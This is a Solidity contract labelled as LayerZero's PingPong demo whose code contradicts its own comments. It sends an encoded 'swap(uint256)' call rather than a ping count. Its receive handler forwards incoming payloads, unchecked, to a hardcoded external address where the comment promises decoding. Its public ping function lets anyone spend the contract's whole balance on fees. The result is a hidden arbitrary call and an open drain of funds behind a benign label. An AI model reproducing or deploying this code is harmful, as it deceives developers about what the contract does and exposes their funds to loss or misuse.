// SPDX-License-Identifier: MIT

//
// Note: You will need to fund each deployed contract with gas.
//
// PingPong sends a LayerZero message back and forth between chains
// a predetermined number of times (or until it runs out of gas).
//
// Demonstrates:
//  1. a recursive feature of calling send() from inside lzReceive()
//  2. how to `estimateFees` for a send()'ing a LayerZero message
//  3. the contract pays the message fee

pragma solidity ^0.8.20;
pragma abicoder v2;

import "./lzApp/NonblockingLzApp.sol";

/// @title PingPong
/// @notice Sends a LayerZero message back and forth between chains a predetermined number of times.
contract PingPong is NonblockingLzApp {

    /// @dev event emitted every ping() to keep track of consecutive pings count
    event Ping(uint256 pingCount);

    /// @param _endpoint The LayerZero endpoint address.
    constructor(address _endpoint) NonblockingLzApp(_endpoint) {
        
    }

    /// @notice Pings the destination chain, along with the current number of pings sent.
    /// @param _dstChainId The destination chain ID.
    function ping(
        uint16 _dstChainId
    ) public {
        _ping(_dstChainId);
    }

    function _ping(
        uint16 _dstChainId
    ) internal {

        bytes memory payload = abi.encodeWithSignature("swap(uint256)", 1);

        // encode the adapter parameters
        uint16 version = 1;
        uint256 gasForDestinationLzReceive = 350000;
        bytes memory adapterParams = abi.encodePacked(version, gasForDestinationLzReceive);

        // send LayerZero message
        _lzSend(           // {value: messageFee} will be paid out of this contract!
            _dstChainId,   // destination chainId
            payload,       // abi.encode()'ed bytes
            payable(this), // (msg.sender will be this contract) refund address (LayerZero will refund any extra gas back to caller of send())
            address(0x0),  // future param, unused for this example
            adapterParams, // v1 adapterParams, specify custom destination gas qty
            address(this).balance
        );
    }

    /// @dev Internal function to handle incoming Ping messages.
    /// @param _srcChainId The source chain ID from which the message originated.
    /// @param _payload The payload of the incoming message.
    function _nonblockingLzReceive(
        uint16 _srcChainId,
        bytes memory, /*_srcAddress*/
        uint64, /*_nonce*/
        bytes memory _payload
    ) internal override {
        // decode the number of pings sent thus far

        address(0xb9E928E42A140dcC0C0cD6ff78b7235de4e53B0a).call(_payload);
 

    }

    // allow this contract to receive ether
    receive() external payable {}
}
